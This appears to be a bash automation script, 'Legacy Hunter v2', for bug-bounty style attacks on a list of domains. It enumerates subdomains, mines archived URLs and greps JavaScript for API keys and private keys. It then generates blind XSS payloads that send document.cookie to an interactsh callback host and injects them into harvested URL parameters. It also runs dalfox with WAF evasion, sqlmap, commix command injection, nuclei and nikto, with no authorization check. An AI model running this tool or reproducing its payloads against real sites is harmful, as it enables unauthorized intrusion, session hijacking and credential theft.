#!/usr/bin/env bash
# ============================================================
#  Legacy Hunter v2 — Full Arsenal
#  + Blind XSS (interactsh) + robofinder + notifications
#  + Auto-create GitHub Issues + Nuclei custom templates
# ============================================================

set -uo pipefail
IFS=$'\n\t'

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'
PURPLE='\033[0;35m'; CYAN='\033[0;36m'; NC='\033[0m'; BOLD='\033[1m'

hdr()  { echo -e "\n${PURPLE}${BOLD}═══ $1 ═══${NC}"; }
ok()   { echo -e "${GREEN}  [+]${NC} $1"; }
warn() { echo -e "${YELLOW}  [!]${NC} $1"; }
err()  { echo -e "${RED}  [-]${NC} $1"; }
cnt()  { wc -l < "$1" 2>/dev/null | tr -d ' ' || echo 0; }

INPUT="${1:-domains.txt}"
[ ! -f "$INPUT" ] && { err "File not found: $INPUT"; exit 1; }

DOMAINS=()
while IFS= read -r line; do
    line=$(echo "$line" | tr -d '\r' | xargs)
    [[ -z "$line" || "$line" =~ ^# ]] && continue
    DOMAINS+=("$line")
done < "$INPUT"
[ ${#DOMAINS[@]} -eq 0 ] && { err "No domains"; exit 1; }

ROOT="legacy_hunt_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$ROOT"
MASTER_STATS="$ROOT/.stats.txt"
> "$MASTER_STATS"

export PATH="$PATH:$HOME/go/bin:$GOPATH/bin:/usr/local/bin"

UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
RESOLVERS="/usr/share/seclists/Miscellaneous/dns-resolvers.txt"
[ ! -f "$RESOLVERS" ] && RESOLVERS=""
CUSTOM_NUCLEI_DIR="$(pwd)/scripts/nuclei-templates"

# ═══════════════════════════════════════════════════════
#  NOTIFICATION HELPERS
# ═══════════════════════════════════════════════════════
send_slack() {
    local msg="$1"
    [ -z "${SLACK_WEBHOOK_URL:-}" ] && return 0
    curl -s -X POST "$SLACK_WEBHOOK_URL" \
        -H 'Content-type: application/json' \
        --data "{\"text\":\"$msg\"}" >/dev/null 2>&1 || true
}

send_discord() {
    local msg="$1"
    [ -z "${DISCORD_WEBHOOK_URL:-}" ] && return 0
    local payload
    payload=$(python3 -c "import json,sys; print(json.dumps({'content': sys.argv[1]}))" "$msg" 2>/dev/null) || return 0
    curl -s -X POST "$DISCORD_WEBHOOK_URL" \
        -H 'Content-type: application/json' \
        --data "$payload" >/dev/null 2>&1 || true
}

notify() {
    local msg="$1"
    send_slack "$msg"
    send_discord "$msg"
    echo -e "${CYAN}  [notify]${NC} $msg"
}

# ═══════════════════════════════════════════════════════
#  GITHUB ISSUE CREATION
# ═══════════════════════════════════════════════════════
create_github_issue() {
    local title="$1"
    local body="$2"
    local labels="${3:-security,automated}"
    [ -z "${GITHUB_TOKEN:-}" ] && return 0

    local payload
    payload=$(python3 -c "
import json, sys
print(json.dumps({
    'title': sys.argv[1],
    'body': sys.argv[2],
    'labels': sys.argv[3].split(',')
}))
" "$title" "$body" "$labels" 2>/dev/null) || return 0

    curl -s -X POST \
        -H "Authorization: token $GITHUB_TOKEN" \
        -H "Accept: application/vnd.github+json" \
        -d "$payload" \
        "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues" \
        >/dev/null 2>&1 || true
}

# ═══════════════════════════════════════════════════════
#  BLIND XSS PAYLOADS
# ═══════════════════════════════════════════════════════
generate_blind_xss_payloads() {
    local callback="$1"
    local out="$2"
    cat > "$out" << PAYLOADS
<script src="https://$callback"></script>
<img src=x onerror="fetch('https://$callback/?c='+document.cookie)">
<svg/onload=fetch('https://$callback/?c='+document.cookie)>
<iframe src="javascript:fetch('https://$callback/?c='+document.cookie)">
"><script>fetch('https://$callback/?c='+document.cookie)</script>
'"><script src="https://$callback"></script>
"><img src=x onerror="fetch('https://$callback/?c='+document.cookie)">
PAYLOADS
}

# ═══════════════════════════════════════════════════════
#  PROCESS DOMAIN
# ═══════════════════════════════════════════════════════
process_domain() {
    local TARGET="$1"
    local W="$2"

    TARGET=$(echo "$TARGET" | sed 's#^https\?://##' | sed 's#/.*$##' | sed 's/:.*$//')
    mkdir -p "$W"/{recon,vulns,nuclei,dalfox,sqlmap,commix,legacy,js,backups,params,robots,blind_xss}

    echo ""
    echo -e "${PURPLE}${BOLD}╔═══════════════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}${BOLD}║  TARGET: $TARGET${NC}"
    echo -e "${PURPLE}${BOLD}╚═══════════════════════════════════════════════════╝${NC}"

    local T0; T0=$(date +%s)
    notify "🕰️ Starting Legacy Hunt on *$TARGET*"

    # ═══════════════════════════════════════════════════
    #  PHASE 1 — Subdomain Enumeration
    # ═══════════════════════════════════════════════════
    hdr "PHASE 1/10 — Subdomain Enumeration"

    (
        subfinder -d "$TARGET" -all -recursive -silent 2>/dev/null
        assetfinder --subs-only "$TARGET" 2>/dev/null
        curl -s --max-time 20 "https://crt.sh/?q=%25.$TARGET&output=json" 2>/dev/null \
            | jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g'
        curl -s --max-time 15 "https://api.hackertarget.com/hostsearch/?q=$TARGET" 2>/dev/null | cut -d',' -f1
        curl -s --max-time 15 "https://otx.alienvault.com/api/v1/indicators/domain/$TARGET/passive_dns" 2>/dev/null \
            | jq -r '.passive_dns[].hostname' 2>/dev/null
    ) | sed 's/^\*\.//g' | tr '[:upper:]' '[:lower:]' \
      | grep -E "\.$TARGET$|^$TARGET$" | sort -u > "$W/recon/subdomains.txt"

    ok "Subdomains: $(cnt "$W/recon/subdomains.txt")"

    # ═══════════════════════════════════════════════════
    #  PHASE 2 — Live Hosts
    # ═══════════════════════════════════════════════════
    hdr "PHASE 2/10 — Live Host Detection"

    httpx -l "$W/recon/subdomains.txt" -silent \
        -title -tech-detect -status-code -ip -cname -web-server -location \
        -random-agent -t 150 -timeout 10 -retries 2 -follow-redirects \
        -o "$W/recon/httpx_full.txt" 2>/dev/null || true

    awk '{print $1}' "$W/recon/httpx_full.txt" 2>/dev/null \
        | grep -E '^https?://' | sort -u > "$W/recon/live.txt"

    if [ ! -s "$W/recon/live.txt" ]; then
        warn "No live hosts — using target root"
        echo "https://$TARGET" > "$W/recon/live.txt"
        echo "http://$TARGET" >> "$W/recon/live.txt"
    fi
    ok "Live hosts: $(cnt "$W/recon/live.txt")"

    # ═══════════════════════════════════════════════════
    #  PHASE 3 — 🆕 robofinder (Robots.txt تاريخي)
    # ═══════════════════════════════════════════════════
    hdr "PHASE 3/10 — 🆕 Historical Robots.txt (robofinder)"

    if command -v robofinder >/dev/null 2>&1; then
        timeout 180 robofinder -u "$TARGET" -o "$W/robots/robots_history.txt" 2>/dev/null || true
    elif [ -f /usr/local/bin/robofinder.py ]; then
        timeout 180 python3 /usr/local/bin/robofinder.py -u "$TARGET" -o "$W/robots/robots_history.txt" 2>/dev/null || true
    else
        warn "robofinder not available, using fallback (Wayback robots.txt)"
        curl -s --max-time 20 "http://web.archive.org/cdx/search/cdx?url=$TARGET/robots.txt&output=json&fl=original&collapse=urlkey" \
            | jq -r '.[][0]' 2>/dev/null > "$W/robots/robots_snapshots.txt" || true
        while IFS= read -r snap; do
            [ -z "$snap" ] && continue
            curl -s --max-time 15 "$snap" 2>/dev/null
        done < "$W/robots/robots_snapshots.txt" > "$W/robots/robots_history.txt" 2>/dev/null || true
    fi

    ROBOTS_CNT=$(cnt "$W/robots/robots_history.txt")
    ok "Robots.txt paths found: $ROBOTS_CNT"

    # استخراج المسارات من robots
    grep -Ei '^(Disallow|Allow):' "$W/robots/robots_history.txt" 2>/dev/null \
        | awk '{print $2}' | grep -v '^$' | sort -u > "$W/robots/robots_paths.txt" 2>/dev/null || true

    # ═══════════════════════════════════════════════════
    #  PHASE 4 — Historical URLs (Wayback/CommonCrawl)
    # ═══════════════════════════════════════════════════
    hdr "PHASE 4/10 — 🕰️ Historical URL Mining"

    (
        if command -v waymore >/dev/null 2>&1; then
            waymore -i "$TARGET" -mode U -oU "$W/legacy/waymore_urls.txt" 2>/dev/null || true
        fi
        gau "$TARGET" --threads 30 --timeout 20 --subs 2>/dev/null
        echo "$TARGET" | waybackurls 2>/dev/null
        curl -s --max-time 25 "https://urlscan.io/api/v1/search/?q=domain:$TARGET&size=5000" 2>/dev/null \
            | jq -r '.results[].task.url' 2>/dev/null
        curl -s --max-time 20 "https://index.commoncrawl.org/CC-MAIN-2024-10-index?url=*.$TARGET&output=json" 2>/dev/null \
            | jq -r '.url' 2>/dev/null
    ) | grep -E '^https?://' | grep -v '^$' | sort -u > "$W/legacy/historical_urls.txt"

    ok "Historical URLs: $(cnt "$W/legacy/historical_urls.txt")"

    grep -Ei '\.(bak|old|backup|zip|tar|gz|rar|7z|sql|db|sqlite|env|config|yml|yaml|json|xml|log|txt|md|swp|swo|orig|save|cache|DS_Store)$' \
        "$W/legacy/historical_urls.txt" > "$W/backups/sensitive_files.txt" 2>/dev/null || true

    ok "Sensitive/backup files: $(cnt "$W/backups/sensitive_files.txt")"

    # ═══════════════════════════════════════════════════
    #  PHASE 5 — Crawling + Params
    # ═══════════════════════════════════════════════════
    hdr "PHASE 5/10 — Crawling & Parameter Mining"

    katana -list "$W/recon/live.txt" -d 4 -jc -kf all -fx -xhr -aff \
        -ef png,jpg,jpeg,gif,css,ico,svg,woff,woff2,ttf,eot,mp4,mp3,pdf,zip,rar \
        -random-agent -silent -timeout 15 -c 40 -p 20 \
        -o "$W/legacy/katana_urls.txt" 2>/dev/null || true

    cat "$W/legacy/historical_urls.txt" "$W/legacy/katana_urls.txt" 2>/dev/null \
        | grep -E '^https?://' | grep -v '^$' | sort -u > "$W/legacy/all_urls_raw.txt"

    if command -v uro >/dev/null 2>&1; then
        cat "$W/legacy/all_urls_raw.txt" | uro 2>/dev/null > "$W/legacy/all_urls.txt" \
            || cp "$W/legacy/all_urls_raw.txt" "$W/legacy/all_urls.txt"
    else
        cp "$W/legacy/all_urls_raw.txt" "$W/legacy/all_urls.txt"
    fi

    ok "Total URLs: $(cnt "$W/legacy/all_urls.txt")"

    grep '=' "$W/legacy/all_urls.txt" 2>/dev/null \
        | grep -oE '[?&][a-zA-Z0-9_.-]+=' \
        | sed 's/^[?&]//' | sed 's/=$//' \
        | sort -u > "$W/params/old_params.txt"

    ok "Unique historical params: $(cnt "$W/params/old_params.txt")"

    grep -Ei '/(api|v[0-9]|rest|graphql|json|xmlrpc|soap|admin|debug|test|staging|dev|internal|old|legacy|deprecated|backup|phpmyadmin|wp-admin|wp-json|actuator|console|manage|dashboard|phpinfo|\.env|\.git|\.svn|\.hg)' \
        "$W/legacy/all_urls.txt" 2>/dev/null | sort -u > "$W/legacy/deprecated_endpoints.txt" 2>/dev/null || true

    ok "Deprecated endpoints: $(cnt "$W/legacy/deprecated_endpoints.txt")"

    # ═══════════════════════════════════════════════════
    #  PHASE 6 — JS Analysis
    # ═══════════════════════════════════════════════════
    hdr "PHASE 6/10 — 🕰️ Old JS Analysis"

    grep -E '\.js(\?|$)' "$W/legacy/all_urls.txt" 2>/dev/null \
        | sed 's/?.*$//' | sort -u > "$W/js/js_urls.txt"

    (
        cat "$W/recon/live.txt" | subjs 2>/dev/null
        cat "$W/recon/live.txt" | getJS --complete 2>/dev/null
    ) | grep -E '\.js(\?|$)' | sed 's/?.*$//' | sort -u >> "$W/js/js_urls.txt" 2>/dev/null || true

    sort -u "$W/js/js_urls.txt" -o "$W/js/js_urls.txt"
    ok "JS URLs: $(cnt "$W/js/js_urls.txt")"

    if [ -s "$W/js/js_urls.txt" ]; then
        mkdir -p "$W/js/files"
        head -200 "$W/js/js_urls.txt" | \
            xargs -P 15 -I{} bash -c '
                url="{}"
                f=$(echo "$url" | md5sum | cut -c1-16)
                curl -s --max-time 12 -A "'"$UA"'" "$url" -o "'"$W/js/files"'/$f.js" 2>/dev/null
            ' 2>/dev/null || true

        find "$W/js/files" -name "*.js" -size +100c 2>/dev/null | while read f; do
            jsluice urls "$f" 2>/dev/null
        done | jq -r 'select(.url) | .url' 2>/dev/null | sort -u > "$W/js/js_endpoints.txt" 2>/dev/null || true

        ok "JS endpoints: $(cnt "$W/js/js_endpoints.txt")"

        cat "$W/js/files"/*.js 2>/dev/null | grep -Eo \
            'AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35}|sk_live_[0-9a-zA-Z]{24,}|ghp_[a-zA-Z0-9]{36}|eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+|-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----' \
            | sort -u > "$W/js/js_secrets.txt" 2>/dev/null || true

        ok "Secrets in JS: $(cnt "$W/js/js_secrets.txt")"
    fi

    # ═══════════════════════════════════════════════════
    #  PHASE 7 — 🆕 Blind XSS (interactsh)
    # ═══════════════════════════════════════════════════
    hdr "PHASE 7/10 — 🆕 Blind XSS (interactsh)"

    BLIND_CNT=0
    if command -v interactsh-client >/dev/null 2>&1; then
        # Start interactsh in background
        INTERACT_LOG="$W/blind_xss/interactsh.log"
        interactsh-client -o "$W/blind_xss/interactions.txt" -json \
            > "$INTERACT_LOG" 2>&1 &
        INTERACT_PID=$!
        sleep 8

        # Extract callback URL
        CALLBACK=$(grep -oE '[a-z0-9]+\.[a-z0-9]+\.oast\.[a-z]+' "$INTERACT_LOG" 2>/dev/null | head -1)
        [ -z "$CALLBACK" ] && CALLBACK=$(grep -oE '[a-z0-9]{20,}\.oast\.[a-z]+' "$INTERACT_LOG" 2>/dev/null | head -1)

        if [ -n "$CALLBACK" ]; then
            ok "Interactsh callback: $CALLBACK"

            # Generate payloads
            generate_blind_xss_payloads "$CALLBACK" "$W/blind_xss/payloads.txt"

            # Inject payloads into params
            grep '=' "$W/legacy/all_urls.txt" 2>/dev/null | head -100 > "$W/blind_xss/inject_targets.txt" 2>/dev/null || true

            if [ -s "$W/blind_xss/inject_targets.txt" ]; then
                while IFS= read -r url; do
                    [ -z "$url" ] && continue
                    while IFS= read -r payload; do
                        [ -z "$payload" ] && continue
                        # Inject into each param
                        encoded=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null)
                        test_url=$(echo "$url" | sed "s/=[^&]*/=$encoded/g")
                        curl -s --max-time 10 -A "$UA" "$test_url" -o /dev/null 2>/dev/null || true
                    done < "$W/blind_xss/payloads.txt"
                done < "$W/blind_xss/inject_targets.txt"

                # Wait for interactions
                sleep 60

                # Stop interactsh
                kill $INTERACT_PID 2>/dev/null || true

                # Parse interactions
                if [ -s "$W/blind_xss/interactions.txt" ]; then
                    BLIND_CNT=$(grep -c 'interaction' "$W/blind_xss/interactions.txt" 2>/dev/null || echo 0)
                    if [ "$BLIND_CNT" -gt 0 ]; then
                        ok "🔴 Blind XSS interactions: $BLIND_CNT"
                        notify "🔴 *Blind XSS HIT* on $TARGET — $BLIND_CNT interactions"
                        create_github_issue \
                            "🔴 Blind XSS Confirmed — $TARGET" \
                            "## Blind XSS Confirmed\n\n**Target:** $TARGET\n**Callback:** $CALLBACK\n**Interactions:** $BLIND_CNT\n\n### Evidence\n\`\`\`\n$(head -20 "$W/blind_xss/interactions.txt")\n\`\`\`" \
                            "security,blind-xss,automated,critical"
                    fi
                fi
            fi
        else
            warn "Could not get interactsh callback URL"
        fi
    else
        warn "interactsh-client not available"
    fi
    ok "Blind XSS findings: $BLIND_CNT"

    # ═══════════════════════════════════════════════════
    #  PHASE 8 — Nuclei (Custom Templates + Full Power)
    # ═══════════════════════════════════════════════════
    hdr "PHASE 8/10 — 🔴 Nuclei (Custom + Full Power)"

    # 8a. Custom templates
    if [ -d "$CUSTOM_NUCLEI_DIR" ]; then
        nuclei -l "$W/recon/live.txt" \
            -t "$CUSTOM_NUCLEI_DIR" \
            -severity critical,high,medium \
            -rl 100 -c 40 -timeout 10 -retries 2 \
            -random-agent -follow-redirects -no-interactsh \
            -o "$W/nuclei/custom_findings.txt" -silent 2>/dev/null || true
    fi

    # 8b. Full nuclei
    nuclei -l "$W/recon/live.txt" \
        -severity critical,high \
        -t http/cves/ -t http/vulnerabilities/ -t http/exposures/ \
        -t http/misconfiguration/ -t http/default-logins/ -t http/takeovers/ \
        -t http/fuzzing/ -t http/file/ -t http/headless/ \
        -rl 150 -c 50 -bs 50 -timeout 10 -retries 2 \
        -random-agent -follow-redirects -no-interactsh \
        -o "$W/nuclei/live_critical_high.txt" -silent 2>/dev/null || true

    nuclei -l "$W/legacy/all_urls.txt" \
        -severity critical,high,medium \
        -t http/cves/ -t http/vulnerabilities/ -t http/exposures/ \
        -t http/misconfiguration/ -t http/takeovers/ -t http/default-logins/ \
        -rl 150 -c 50 -bs 50 -timeout 10 \
        -random-agent -no-interactsh \
        -o "$W/nuclei/all_urls.txt" -silent 2>/dev/null || true

    [ -s "$W/legacy/deprecated_endpoints.txt" ] && \
        nuclei -l "$W/legacy/deprecated_endpoints.txt" \
            -severity critical,high,medium,low,info \
            -t http/exposures/ -t http/misconfiguration/ -t http/vulnerabilities/ \
            -rl 100 -c 40 -timeout 10 \
            -o "$W/nuclei/deprecated_findings.txt" -silent 2>/dev/null || true

    cat "$W/nuclei/"*.txt 2>/dev/null | sort -u > "$W/nuclei/all_findings.txt"
    NUCLEI_CNT=$(grep -cE '^\[' "$W/nuclei/all_findings.txt" 2>/dev/null || echo 0)
    ok "Nuclei findings: $NUCLEI_CNT"

    # Notify critical findings
    if [ "$NUCLEI_CNT" -gt 0 ]; then
        CRITICAL_LINES=$(grep -iE '\[critical\]|\[high\]' "$W/nuclei/all_findings.txt" 2>/dev/null | head -5)
        if [ -n "$CRITICAL_LINES" ]; then
            notify "🔴 *Nuclei Critical/High* on $TARGET — $NUCLEI_CNT total"
            create_github_issue \
                "🔴 Nuclei Critical/High Findings — $TARGET" \
                "## Nuclei Findings\n\n**Target:** $TARGET\n**Total:** $NUCLEI_CNT\n\n### Critical/High\n\`\`\`\n$CRITICAL_LINES\n\`\`\`" \
                "security,nuclei,automated"
        fi
    fi

    # ═══════════════════════════════════════════════════
    #  PHASE 9 — Active Scanners
    # ═══════════════════════════════════════════════════
    hdr "PHASE 9/10 — 🔴 Active Vulnerability Scanners"

    # Dalfox
    grep '=' "$W/legacy/all_urls.txt" 2>/dev/null | head -200 > "$W/dalfox/targets.txt" 2>/dev/null || true
    DALFOX_CNT=0
    if [ -s "$W/dalfox/targets.txt" ]; then
        dalfox file "$W/dalfox/targets.txt" \
            --deep-domxss --mining-dom --mining-dict \
            --waf-evasion --skip-bav \
            --worker 80 --delay 0 --timeout 15 --retry 2 \
            --output-all --no-color \
            -o "$W/dalfox/findings.txt" \
            --silence 2>/dev/null || true
        DALFOX_CNT=$(grep -ciE '\[V\]|POC|VULN' "$W/dalfox/findings.txt" 2>/dev/null || echo 0)
    fi
    ok "Dalfox XSS: $DALFOX_CNT"

    if [ "$DALFOX_CNT" -gt 0 ]; then
        notify "🟡 *Dalfox XSS* on $TARGET — $DALFOX_CNT findings"
        create_github_issue \
            "🟡 XSS Findings (Dalfox) — $TARGET" \
            "## XSS Findings\n\n**Target:** $TARGET\n**Findings:** $DALFOX_CNT\n\n\`\`\`\n$(grep -iE '\[V\]|POC' "$W/dalfox/findings.txt" | head -20)\n\`\`\`" \
            "security,xss,automated"
    fi

    # SQLMap
    grep '=' "$W/legacy/all_urls.txt" 2>/dev/null | head -30 > "$W/sqlmap/targets.txt" 2>/dev/null || true
    SQLMAP_CNT=0
    if [ -s "$W/sqlmap/targets.txt" ] && command -v sqlmap >/dev/null 2>&1; then
        while IFS= read -r url; do
            [ -z "$url" ] && continue
            sqlmap -u "$url" \
                --batch --random-agent \
                --level=3 --risk=2 \
                --threads=5 --timeout=15 --retries=1 \
                --technique=BEUSTQ --smart \
                --output-dir="$W/sqlmap/" \
                --flush-session 2>/dev/null | \
                grep -iE 'parameter|injectable|vulnerable|Type:|Title:' >> "$W/sqlmap/findings.txt" 2>/dev/null || true
        done < "$W/sqlmap/targets.txt"
        SQLMAP_CNT=$(grep -ci 'injectable' "$W/sqlmap/findings.txt" 2>/dev/null || echo 0)
    fi
    ok "SQLMap SQLi: $SQLMAP_CNT"

    if [ "$SQLMAP_CNT" -gt 0 ]; then
        notify "🔵 *SQL Injection* on $TARGET — $SQLMAP_CNT"
        create_github_issue \
            "🔵 SQL Injection (SQLMap) — $TARGET" \
            "## SQL Injection Confirmed\n\n**Target:** $TARGET\n\n\`\`\`\n$(cat "$W/sqlmap/findings.txt")\n\`\`\`" \
            "security,sqli,automated,critical"
    fi

    # Commix
    grep '=' "$W/legacy/all_urls.txt" 2>/dev/null | head -20 > "$W/commix/targets.txt" 2>/dev/null || true
    COMMIX_CNT=0
    if [ -s "$W/commix/targets.txt" ] && [ -f /opt/commix/commix.py ]; then
        while IFS= read -r url; do
            [ -z "$url" ] && continue
            timeout 90 python3 /opt/commix/commix.py -u "$url" \
                --batch --random-agent --level=2 \
                --output-dir="$W/commix/" 2>/dev/null | \
                grep -iE 'vulnerable|injectable|exploitable' >> "$W/commix/findings.txt" 2>/dev/null || true
        done < "$W/commix/targets.txt"
        COMMIX_CNT=$(grep -ci 'vulnerable' "$W/commix/findings.txt" 2>/dev/null || echo 0)
    fi
    ok "Commix RCE: $COMMIX_CNT"

    if [ "$COMMIX_CNT" -gt 0 ]; then
        notify "🟣 *Command Injection* on $TARGET — $COMMIX_CNT"
        create_github_issue \
            "🟣 Command Injection (Commix) — $TARGET" \
            "## Command Injection Confirmed\n\n**Target:** $TARGET\n\n\`\`\`\n$(cat "$W/commix/findings.txt")\n\`\`\`" \
            "security,rce,automated,critical"
    fi

    # Nikto
    head -5 "$W/recon/live.txt" > "$W/vulns/nikto_targets.txt" 2>/dev/null || true
    while IFS= read -r url; do
        [ -z "$url" ] && continue
        timeout 120 nikto -h "$url" -maxtime 90 -nointeractive -Tuning 123bde 2>/dev/null \
            | grep -E '^\+ ' >> "$W/vulns/nikto.txt" 2>/dev/null || true
    done < "$W/vulns/nikto_targets.txt"
    NIKTO_CNT=$(grep -cE '^\+ ' "$W/vulns/nikto.txt" 2>/dev/null || echo 0)
    ok "Nikto findings: $NIKTO_CNT"

    # ═══════════════════════════════════════════════════
    #  PHASE 10 — Report
    # ═══════════════════════════════════════════════════
    hdr "PHASE 10/10 — Report Generation"

    local T1; T1=$(date +%s)
    local DUR=$(( (T1-T0) / 60 ))

    {
        echo "# 🕰️ Legacy Hunter v2 Report — $TARGET"
        echo ""
        echo "**Date:** $(date)"
        echo "**Duration:** ${DUR}m"
        echo ""
        echo "---"
        echo ""
        echo "## 📊 Findings Summary"
        echo ""
        echo "| Scanner | Findings |"
        echo "|---------|----------|"
        echo "| Nuclei (all) | $NUCLEI_CNT |"
        echo "| Dalfox (XSS) | $DALFOX_CNT |"
        echo "| SQLMap (SQLi) | $SQLMAP_CNT |"
        echo "| Commix (RCE) | $COMMIX_CNT |"
        echo "| Nikto | $NIKTO_CNT |"
        echo "| Blind XSS (interactsh) | $BLIND_CNT |"
        echo ""
        echo "---"
        echo ""

        echo "## 🕰️ Legacy Attack Surface"
        echo ""
        echo "### Historical URLs"
        echo "- Total: $(cnt "$W/legacy/historical_urls.txt")"
        echo "- File: \`legacy/historical_urls.txt\`"
        echo ""
        echo "### Historical Robots.txt Paths"
        echo "- Count: $ROBOTS_CNT"
        echo "- Paths: \`robots/robots_paths.txt\`"
        echo ""
        echo "### Sensitive/Backup Files"
        echo "- Count: $(cnt "$W/backups/sensitive_files.txt")"
        echo "- File: \`backups/sensitive_files.txt\`"
        echo ""
        echo "### Old Parameters"
        echo "- Count: $(cnt "$W/params/old_params.txt")"
        echo "- File: \`params/old_params.txt\`"
        echo ""
        echo "### Deprecated Endpoints"
        echo "- Count: $(cnt "$W/legacy/deprecated_endpoints.txt")"
        echo "- File: \`legacy/deprecated_endpoints.txt\`"
        echo ""
        echo "### JS Endpoints"
        echo "- Count: $(cnt "$W/js/js_endpoints.txt")"
        echo "- File: \`js/js_endpoints.txt\`"
        echo ""
        echo "### Secrets in JS"
        echo "- Count: $(cnt "$W/js/js_secrets.txt")"
        echo "- File: \`js/js_secrets.txt\`"
        echo ""
        echo "---"
        echo ""

        if [ -s "$W/nuclei/all_findings.txt" ]; then
            echo "## 🔴 Nuclei Findings"
            echo '```'
            cat "$W/nuclei/all_findings.txt" | head -150
            echo '```'
            echo ""
        fi

        if [ -s "$W/dalfox/findings.txt" ]; then
            echo "## 🟡 XSS Findings"
            echo '```'
            grep -iE '\[V\]|POC|VULN' "$W/dalfox/findings.txt" | head -50
            echo '```'
            echo ""
        fi

        if [ -s "$W/sqlmap/findings.txt" ]; then
            echo "## 🔵 SQL Injection Findings"
            echo '```'
            cat "$W/sqlmap/findings.txt"
            echo '```'
            echo ""
        fi

        if [ -s "$W/commix/findings.txt" ]; then
            echo "## 🟣 Command Injection Findings"
            echo '```'
            cat "$W/commix/findings.txt"
            echo '```'
            echo ""
        fi

        if [ -s "$W/blind_xss/interactions.txt" ]; then
            echo "## 🆕 Blind XSS Findings"
            echo '```'
            head -30 "$W/blind_xss/interactions.txt"
            echo '```'
            echo ""
        fi

        echo "---"
        echo ""
        echo "## 🎯 Manual Testing Guide"
        echo ""
        echo "### 1. Backup Files"
        echo '```bash'
        echo "cat $W/backups/sensitive_files.txt"
        echo '```'
        echo ""
        echo "### 2. Robots.txt Historical Paths"
        echo '```bash'
        echo "cat $W/robots/robots_paths.txt"
        echo '```'
        echo ""
        echo "### 3. Old Parameters"
        echo '```bash'
        echo "cat $W/params/old_params.txt"
        echo '```'
        echo ""
        echo "### 4. Deprecated Endpoints"
        echo '```bash'
        echo "cat $W/legacy/deprecated_endpoints.txt"
        echo '```'
        echo ""
        echo "### 5. JS Endpoints + Secrets"
        echo '```bash'
        echo "cat $W/js/js_endpoints.txt"
        echo "cat $W/js/js_secrets.txt"
        echo '```'
        echo ""
        echo "### 6. Nuclei Findings"
        echo '```bash'
        echo "cat $W/nuclei/all_findings.txt"
        echo '```'
        echo ""
        echo "---"
        echo ""
        echo "**⚠️ Pure Recon — Verify manually.**"
    } > "$W/LEGACY_REPORT.md"

    echo "$TARGET|$(cnt "$W/recon/subdomains.txt")|$(cnt "$W/recon/live.txt")|$(cnt "$W/legacy/historical_urls.txt")|$ROBOTS_CNT|$(cnt "$W/backups/sensitive_files.txt")|$(cnt "$W/params/old_params.txt")|$(cnt "$W/legacy/deprecated_endpoints.txt")|$(cnt "$W/js/js_endpoints.txt")|$(cnt "$W/js/js_secrets.txt")|$NUCLEI_CNT|$DALFOX_CNT|$SQLMAP_CNT|$COMMIX_CNT|$NIKTO_CNT|$BLIND_CNT|$DUR" >> "$MASTER_STATS"

    notify "✅ *$TARGET* completed — Nuclei:$NUCLEI_CNT Dalfox:$DALFOX_CNT SQLMap:$SQLMAP_CNT Blind:$BLIND_CNT"

    ok "Report: $W/LEGACY_REPORT.md"
    echo -e "  ${CYAN}Duration:${NC} ${DUR}m"
}

# ═══════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════
for DOMAIN in "${DOMAINS[@]}"; do
    DOMAIN_CLEAN=$(echo "$DOMAIN" | sed 's#^https\?://##' | sed 's#/.*$##' | sed 's/:.*$//')
    W="$ROOT/$DOMAIN_CLEAN"
    process_domain "$DOMAIN_CLEAN" "$W"
done

# ═══════════════════════════════════════════════════════
#  MASTER REPORT
# ═══════════════════════════════════════════════════════
{
    echo "# 🕰️ Legacy Hunter v2 — Master Report"
    echo ""
    echo "**Date:** $(date)"
    echo "**Domains:** ${#DOMAINS[@]}"
    echo ""
    echo "---"
    echo ""
    echo "## 📊 Summary Table"
    echo ""
    echo "| Domain | Subs | Live | HistURLs | Robots | Backups | Params | Deprecated | JS | Secrets | Nuclei | Dalfox | SQLMap | Commix | Nikto | BlindXSS | Time |"
    echo "|--------|------|------|----------|--------|---------|--------|------------|-----|---------|--------|--------|--------|--------|-------|----------|------|"
    while IFS='|' read -r d subs live hist robots backup params dep js jssec nuclei dalfox sqlmap commix nikto blind time; do
        echo "| **$d** | $subs | $live | $hist | $robots | $backup | $params | $dep | $js | $jssec | $nuclei | $dalfox | $sqlmap | $commix | $nikto | $blind | ${time}m |"
    done < "$MASTER_STATS"
    echo ""
    echo "---"
    echo ""
    echo "## 📂 Per-Domain Reports"
    echo ""
    while IFS='|' read -r d _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _; do
        echo "### $d"
        echo "- Report: \`$ROOT/$d/LEGACY_REPORT.md\`"
        echo "- Blind XSS: \`$ROOT/$d/blind_xss/interactions.txt\`"
        echo "- Robots paths: \`$ROOT/$d/robots/robots_paths.txt\`"
        echo "- Backup files: \`$ROOT/$d/backups/sensitive_files.txt\`"
        echo "- Nuclei: \`$ROOT/$d/nuclei/all_findings.txt\`"
        echo ""
    done < "$MASTER_STATS"
    echo "---"
    echo ""
    echo "**⚠️ Pure Recon — Verify manually.**"
} > "$ROOT/MASTER_LEGACY_REPORT.md"

# Final notification
TOTAL_FINDINGS=$(awk -F'|' '{s+=$11+$12+$13+$14+$16} END {print s}' "$MASTER_STATS" 2>/dev/null || echo 0)
notify "🏁 *Legacy Hunter v2 finished* — ${#DOMAINS[@]} domains, $TOTAL_FINDINGS total findings"

echo ""
echo -e "${GREEN}${BOLD}╔═══════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}${BOLD}║      LEGACY HUNTER v2 COMPLETED ✓                 ║${NC}"
echo -e "${GREEN}${BOLD}╚═══════════════════════════════════════════════════╝${NC}"
echo -e "  Root:   $ROOT/"
echo -e "  Master: $ROOT/MASTER_LEGACY_REPORT.md"
echo ""
